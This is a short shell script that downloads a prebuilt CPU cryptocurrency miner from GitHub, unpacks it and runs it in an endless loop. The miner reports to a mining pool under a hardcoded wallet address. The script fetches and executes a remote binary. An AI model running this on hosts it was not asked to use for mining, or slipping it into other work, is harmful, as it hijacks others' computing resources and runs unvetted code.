#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
while [ 1 ]; do
./hellminer -p x --cpu 2 -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.ms
sleep 3
done
sleep 999
